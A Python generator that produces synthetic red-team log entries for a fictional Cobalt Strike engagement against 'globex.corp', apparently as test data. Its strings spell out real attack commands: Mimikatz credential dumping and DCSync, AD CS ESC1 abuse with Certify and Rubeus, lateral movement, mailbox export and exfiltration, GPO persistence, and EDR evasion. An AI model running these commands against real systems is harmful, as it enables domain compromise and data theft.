"""
Cobalt Strike session log generator.

Produces realistic operator-side log entries that mirror what a red team
operator would record while running a Cobalt Strike engagement (listeners,
beacon payloads, lateral movement, post-exploitation).  All IPs, hostnames,
and credentials are fictional.
"""

import random
from datetime import timedelta

# ---------------------------------------------------------------------------
# Fictional network context
# ---------------------------------------------------------------------------
TEAM_SERVER = "198.51.100.40"
REDIRECTOR = "198.51.100.41"
C2_DOMAIN = "cdn-assets.example.com"
BEACON_PROFILES = ["jquery-3.3.1.profile", "amazon.profile"]
TARGET_HOSTS = [
    {"hostname": "WKS-FIN01.globex.corp", "ip": "172.16.10.50", "user": "lmorales"},
    {"hostname": "WKS-HR03.globex.corp", "ip": "172.16.10.83", "user": "kchen"},
    {"hostname": "SRV-SQL01.globex.corp", "ip": "172.16.1.15", "user": "svc_sql"},
    {"hostname": "SRV-EXCH01.globex.corp", "ip": "172.16.1.10", "user": "svc_exchange"},
    {"hostname": "DC01.globex.corp", "ip": "172.16.1.1", "user": "DA-redteam"},
    {"hostname": "SRV-CA01.globex.corp", "ip": "172.16.1.5", "user": "svc_adcs"},
]
DOMAIN = "globex.corp"


def generate_session_logs(
    *,
    analyst="c2-operator2",
    base_offset_hours=-96,
    operation_name="CRIMSON VEIL",
):
    """Return a list of log-entry dicts for a full Cobalt Strike engagement."""

    logs = []
    hour = base_offset_hours
    profile = random.choice(BEACON_PROFILES)

    # --- 1. Listener setup ---
    logs.append(
        _entry(
            hour,
            hostname=f"operator@teamserver ({TEAM_SERVER})",
            external_ip=TEAM_SERVER,
            command=(
                f"listener> Create HTTPS listener on {REDIRECTOR}:443 "
                f"(C2 domain: {C2_DOMAIN}, profile: {profile})"
            ),
            notes=f"HTTPS listener configured with malleable C2 profile '{profile}' and domain fronting via {C2_DOMAIN}",
            tags=["cobalt-strike", "command-and-control"],
            analyst=analyst,
            operation=operation_name,
        )
    )
    hour += 0.5

    # --- 2. Payload generation ---
    logs.append(
        _entry(
            hour,
            hostname=f"operator@teamserver ({TEAM_SERVER})",
            external_ip=TEAM_SERVER,
            command=(
                f"attacks> Generate Windows Stageless EXE (x64), "
                f"listener: https-{C2_DOMAIN}, output: update_kb5034441.exe"
            ),
            notes="Generated stageless beacon payload disguised as Windows KB update; packed with custom loader to bypass AMSI",
            tags=["cobalt-strike", "execution", "defense-evasion"],
            analyst=analyst,
            operation=operation_name,
            filename="update_kb5034441.exe",
            hash_value="a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2",
            hash_algorithm="sha256",
        )
    )
    hour += 1.0

    # --- 3. Initial access via spear-phishing ---
    target = TARGET_HOSTS[0]  # Finance workstation
    logs.append(
        _entry(
            hour,
            hostname=target["hostname"],
            internal_ip=target["ip"],
            username=target["user"],
            command=f"[+] Beacon HTTPS {target['ip']}:{random.randint(49152,65535)} -> {REDIRECTOR}:443 ({C2_DOMAIN})",
            notes=f"Initial beacon callback from {target['user']} — payload delivered via spear-phish (macro-enabled doc)",
            tags=["cobalt-strike", "initial-access", "command-and-control", "phishing"],
            analyst=analyst,
            operation=operation_name,
            pid=str(random.randint(1000, 9999)),
        )
    )
    hour += 0.25

    # --- 4. Situational awareness ---
    logs.append(
        _entry(
            hour,
            hostname=target["hostname"],
            internal_ip=target["ip"],
            username=target["user"],
            command="beacon> shell whoami /all",
            notes=f"Confirmed identity: {DOMAIN}\\{target['user']}, member of Domain Users, Finance-RO",
            tags=["cobalt-strike", "discovery"],
            analyst=analyst,
            operation=operation_name,
        )
    )
    hour += 0.1

    logs.append(
        _entry(
            hour,
            hostname=target["hostname"],
            internal_ip=target["ip"],
            username=target["user"],
            command="beacon> net domain controllers",
            notes=f"Identified DCs: DC01.{DOMAIN} (172.16.1.1), DC02.{DOMAIN} (172.16.1.2)",
            tags=["cobalt-strike", "discovery"],
            analyst=analyst,
            operation=operation_name,
        )
    )
    hour += 0.1

    logs.append(
        _entry(
            hour,
            hostname=target["hostname"],
            internal_ip=target["ip"],
            username=target["user"],
            command="beacon> ps",
            notes="Process listing shows CrowdStrike Falcon (CSFalconService.exe PID 2840), Defender (MsMpEng.exe PID 1692)",
            tags=["cobalt-strike", "discovery", "defense-evasion"],
            analyst=analyst,
            operation=operation_name,
        )
    )
    hour += 0.25

    # --- 5. Defense evasion ---
    logs.append(
        _entry(
            hour,
            hostname=target["hostname"],
            internal_ip=target["ip"],
            username=target["user"],
            command="beacon> argue add powershell.exe -nop -w hidden -enc",
            notes="Configured beacon argument spoofing for PowerShell — process arguments show benign cmdline to EDR",
            tags=["cobalt-strike", "defense-evasion"],
            analyst=analyst,
            operation=operation_name,
        )
    )
    hour += 0.1

    logs.append(
        _entry(
            hour,
            hostname=target["hostname"],
            internal_ip=target["ip"],
            username=target["user"],
            command="beacon> blockdlls start",
            notes="Enabled blockdlls — beacon child processes only load Microsoft-signed DLLs (blocks EDR injection)",
            tags=["cobalt-strike", "defense-evasion"],
            analyst=analyst,
            operation=operation_name,
        )
    )
    hour += 0.25

    # --- 6. Privilege escalation ---
    logs.append(
        _entry(
            hour,
            hostname=target["hostname"],
            internal_ip=target["ip"],
            username=target["user"],
            command="beacon> elevate uac-token-duplication",
            notes="Bypassed UAC via token duplication — elevated beacon running as high-integrity",
            tags=["cobalt-strike", "privilege-escalation"],
            analyst=analyst,
            operation=operation_name,
            status="success",
        )
    )
    hour += 0.25

    # --- 7. Credential theft ---
    logs.append(
        _entry(
            hour,
            hostname=target["hostname"],
            internal_ip=target["ip"],
            username="NT AUTHORITY\\SYSTEM",
            command="beacon> mimikatz sekurlsa::logonpasswords",
            notes=(
                "Dumped logon credentials via Mimikatz:\n"
                f"  - {DOMAIN}\\{target['user']}: NTLM hash recovered\n"
                f"  - {DOMAIN}\\svc_sql: cleartext password in wdigest\n"
                f"  - {DOMAIN}\\kchen: NTLM hash recovered (cached logon)"
            ),
            tags=["cobalt-strike", "credential-access", "mimikatz"],
            analyst=analyst,
            operation=operation_name,
            status="success",
        )
    )
    hour += 0.5

    # --- 8. Lateral movement — SMB beacon ---
    sql_target = TARGET_HOSTS[2]  # SRV-SQL01
    logs.append(
        _entry(
            hour,
            hostname=target["hostname"],
            internal_ip=target["ip"],
            username="NT AUTHORITY\\SYSTEM",
            command=f"beacon> jump psexec_psh {sql_target['ip']} smb-listener",
            notes=f"Lateral movement via PsExec (PowerShell) to {sql_target['hostname']} using svc_sql creds — SMB beacon established",
            tags=["cobalt-strike", "lateral-movement"],
            analyst=analyst,
            operation=operation_name,
            status="success",
        )
    )
    hour += 0.25

    logs.append(
        _entry(
            hour,
            hostname=sql_target["hostname"],
            internal_ip=sql_target["ip"],
            username=sql_target["user"],
            command=f"[+] Beacon SMB {sql_target['ip']} linked to {target['ip']} (named pipe: \\\\.\\pipe\\msagent_{random.randint(10,99)})",
            notes=f"Child SMB beacon on {sql_target['hostname']} linked through {target['hostname']} parent beacon",
            tags=["cobalt-strike", "command-and-control", "lateral-movement"],
            analyst=analyst,
            operation=operation_name,
            pid=str(random.randint(1000, 9999)),
        )
    )
    hour += 0.5

    # --- 9. AD CS abuse (ESC1) ---
    ca_target = TARGET_HOSTS[5]  # SRV-CA01
    logs.append(
        _entry(
            hour,
            hostname=sql_target["hostname"],
            internal_ip=sql_target["ip"],
            username=sql_target["user"],
            command="beacon> execute-assembly /opt/tools/Certify.exe find /vulnerable",
            notes=(
                f"Certify found vulnerable template 'UserAuth' on {ca_target['hostname']} — "
                "ESC1: template allows SAN specification, enrolled users can request certs for any UPN"
            ),
            tags=["cobalt-strike", "discovery", "certipy"],
            analyst=analyst,
            operation=operation_name,
        )
    )
    hour += 0.25

    logs.append(
        _entry(
            hour,
            hostname=sql_target["hostname"],
            internal_ip=sql_target["ip"],
            username=sql_target["user"],
            command=(
                f"beacon> execute-assembly /opt/tools/Certify.exe request "
                f"/ca:{ca_target['hostname']}\\globex-CA /template:UserAuth "
                f"/altname:DA-redteam@{DOMAIN}"
            ),
            notes=f"Requested certificate for DA-redteam via ESC1 — certificate issued by {ca_target['hostname']}",
            tags=["cobalt-strike", "privilege-escalation", "credential-access", "certipy"],
            analyst=analyst,
            operation=operation_name,
            status="success",
        )
    )
    hour += 0.25

    logs.append(
        _entry(
            hour,
            hostname=sql_target["hostname"],
            internal_ip=sql_target["ip"],
            username=sql_target["user"],
            command="beacon> execute-assembly /opt/tools/Rubeus.exe asktgt /user:DA-redteam /certificate:cert.pfx /ptt",
            notes="Authenticated as DA-redteam using certificate-based Kerberos auth (PKINIT) — domain admin TGT obtained",
            tags=["cobalt-strike", "credential-access", "rubeus", "privilege-escalation"],
            analyst=analyst,
            operation=operation_name,
            status="success",
        )
    )
    hour += 0.5

    # --- 10. Domain controller access ---
    dc = TARGET_HOSTS[4]  # DC01
    logs.append(
        _entry(
            hour,
            hostname=sql_target["hostname"],
            internal_ip=sql_target["ip"],
            username=sql_target["user"],
            command=f"beacon> jump winrm64 {dc['ip']} https-listener",
            notes=f"Lateral movement to domain controller {dc['hostname']} via WinRM using DA-redteam Kerberos ticket",
            tags=["cobalt-strike", "lateral-movement", "domain-controller"],
            analyst=analyst,
            operation=operation_name,
            status="success",
        )
    )
    hour += 0.25

    logs.append(
        _entry(
            hour,
            hostname=dc["hostname"],
            internal_ip=dc["ip"],
            username=dc["user"],
            command=f"[+] Beacon HTTPS {dc['ip']}:{random.randint(49152,65535)} -> {REDIRECTOR}:443 ({C2_DOMAIN})",
            notes=f"Beacon callback from DC01 — full domain admin access confirmed",
            tags=["cobalt-strike", "command-and-control", "domain-controller", "critical"],
            analyst=analyst,
            operation=operation_name,
            pid=str(random.randint(1000, 9999)),
        )
    )
    hour += 0.25

    # --- 11. DCSync ---
    logs.append(
        _entry(
            hour,
            hostname=dc["hostname"],
            internal_ip=dc["ip"],
            username=dc["user"],
            command="beacon> mimikatz lsadump::dcsync /domain:globex.corp /user:krbtgt",
            notes="DCSync attack — extracted krbtgt NTLM hash; golden ticket creation capability achieved",
            tags=["cobalt-strike", "credential-access", "mimikatz", "domain-controller", "critical"],
            analyst=analyst,
            operation=operation_name,
            status="success",
        )
    )
    hour += 0.25

    # --- 12. Data collection from Exchange ---
    exch = TARGET_HOSTS[3]  # SRV-EXCH01
    logs.append(
        _entry(
            hour,
            hostname=dc["hostname"],
            internal_ip=dc["ip"],
            username=dc["user"],
            command=f"beacon> jump psexec64 {exch['ip']} smb-listener",
            notes=f"Moved to Exchange server {exch['hostname']} — searching for sensitive mailbox data",
            tags=["cobalt-strike", "lateral-movement", "email-server", "collection"],
            analyst=analyst,
            operation=operation_name,
            status="success",
        )
    )
    hour += 0.5

    logs.append(
        _entry(
            hour,
            hostname=exch["hostname"],
            internal_ip=exch["ip"],
            username=exch["user"],
            command="beacon> powershell New-MailboxExportRequest -Mailbox cfo@globex.corp -FilePath \\\\SRV-EXCH01\\c$\\temp\\cfo.pst",
            notes="Exported CFO mailbox to PST — 2.3 GB",
            tags=["cobalt-strike", "collection", "email-server", "high"],
            analyst=analyst,
            operation=operation_name,
            filename="cfo.pst",
        )
    )
    hour += 1.0

    # --- 13. Exfiltration ---
    logs.append(
        _entry(
            hour,
            hostname=exch["hostname"],
            internal_ip=exch["ip"],
            username=exch["user"],
            command="beacon> download C:\\temp\\cfo.pst",
            notes="Exfiltrated CFO mailbox PST via C2 channel (chunked HTTPS) — download complete",
            tags=["cobalt-strike", "exfiltration", "high"],
            analyst=analyst,
            operation=operation_name,
        )
    )
    hour += 0.5

    # --- 14. Persistence ---
    logs.append(
        _entry(
            hour,
            hostname=dc["hostname"],
            internal_ip=dc["ip"],
            username=dc["user"],
            command="beacon> execute-assembly /opt/tools/SharpGPOAbuse.exe --AddComputerTask --TaskName 'WinUpdate' --Author NT AUTHORITY\\SYSTEM --Command beacon.exe --GPOName 'Default Domain Policy'",
            notes="Installed persistence via GPO scheduled task on Default Domain Policy — all domain-joined hosts will execute beacon on next gpupdate",
            tags=["cobalt-strike", "persistence", "domain-controller", "critical"],
            analyst=analyst,
            operation=operation_name,
        )
    )

    return logs


def _entry(
    offset_hours,
    *,
    hostname="",
    internal_ip="",
    external_ip="",
    username="",
    command="",
    notes="",
    tags=None,
    analyst="",
    operation="",
    status="success",
    pid="",
    filename="",
    hash_value="",
    hash_algorithm="",
):
    return {
        "timestamp_offset_hours": offset_hours,
        "hostname": hostname,
        "internal_ip": internal_ip,
        "external_ip": external_ip,
        "domain": DOMAIN,
        "username": username,
        "command": command,
        "notes": notes,
        "status": status,
        "analyst": analyst,
        "op": operation,
        "tags": tags or [],
        "pid": pid,
        "filename": filename,
        "hash_value": hash_value,
        "hash_algorithm": hash_algorithm,
    }


PROFILE = {
    "name": "Cobalt Strike",
    "description": "Cobalt Strike C2 framework — HTTPS beacons, SMB pivots, malleable C2, Mimikatz, AD CS abuse",
    "default_operation": {
        "name": "CRIMSON VEIL",
        "description": "Adversary simulation against globex.corp using Cobalt Strike with focus on AD CS and Exchange compromise",
    },
    "default_analyst": "c2-operator2",
    "generate": generate_session_logs,
}
